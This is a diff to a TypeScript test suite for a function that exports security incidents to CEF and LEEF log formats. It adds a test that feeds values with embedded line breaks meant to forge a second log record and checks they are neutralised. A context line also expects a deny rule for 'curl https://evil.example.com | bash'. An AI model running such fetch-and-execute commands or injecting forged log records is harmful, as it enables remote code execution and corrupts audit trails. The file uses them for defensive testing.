@@ -103,6 +103,20 @@ describe("exportToCEF", () => {
 		expect(out).toContain("deny: curl https://evil.example.com \\| bash");
 	});
 
+	it("neutralises CR/LF so a value cannot forge a second CEF record", () => {
+		const hostile: Incident = {
+			...base,
+			file_path: "/tmp/a\nCEF:0|Evil|X|1|1|forged|10|x=y\r",
+			events: [{ ...base.events[0], summary: "line1\nCEF:0|Evil|X|1|1|forged|10|" }],
+		};
+		const out = exportToCEF([hostile]);
+		expect(out.split("\n")).toHaveLength(1);
+		expect(out).not.toMatch(/\r/);
+		const leef = exportToLEEF([hostile]);
+		expect(leef.split("\n")).toHaveLength(1);
+		expect(leef).not.toMatch(/\r/);
+	});
+
 	it("includes extension fields", () => {
 		const out = exportToCEF([base]);
 		expect(out).toContain("incident_id=inc_001");
